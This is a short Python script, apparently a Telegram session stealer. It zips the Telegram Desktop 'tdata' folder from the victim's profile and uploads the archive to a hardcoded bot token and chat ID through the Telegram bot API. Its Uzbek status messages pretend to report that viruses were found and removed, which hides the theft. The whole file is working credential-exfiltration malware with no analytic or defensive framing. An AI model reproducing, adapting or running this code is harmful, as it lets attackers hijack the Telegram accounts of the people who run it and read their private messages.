import os
import zipfile
import requests
from pathlib import Path

def zip_tdata_directly():
    tdata_path = Path.home() / "AppData" / "Roaming" / "Telegram Desktop" / "tdata"
    zip_path = Path.home() / "Documents" / "tdata_backup.zip"

    if not tdata_path.exists():
        print("viruslar bor")
        return None

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, tdata_path)
                try:
                    zipf.write(full_path, arcname)
                except PermissionError:
                    print(f"[⚠️] Ruxsat yo‘q, o‘tkazildi: {full_path}")
                except Exception as e:
                    print(f"[⚠️] Xatolik: {full_path} — {e}")

    print(f"[✅] viruslar muvaffaqiyatli yuq  qilindi: {zip_path}")
    return zip_path

def send_zip_to_telegram(zip_file_path, bot_token, chat_id):
    if not zip_file_path or not os.path.exists(zip_file_path):
        print("[❌] ZIP fayli mavjud emas.")
        return

    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

    try:
        with open(zip_file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id}
            response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print("[✅] tugad !")
        else:
            print(f"[❌]  xatolik: {response.status_code} — {response.text}")
    except Exception as e:
        print(f" xatolik: {e}")

if __name__ == "__main__":
    # ZIP yaratish
    zip_path = zip_tdata_directly()

    # Telegram ma'lumotlari (siz berganlar):
    bot_token = "7211406891:AAHrj9KRnE82oxZXJKthmnL7XkoCzsFZtE0"
    chat_id = "6655243292"

    # ZIP ni yuborish
    send_zip_to_telegram(zip_path, bot_token, chat_id)
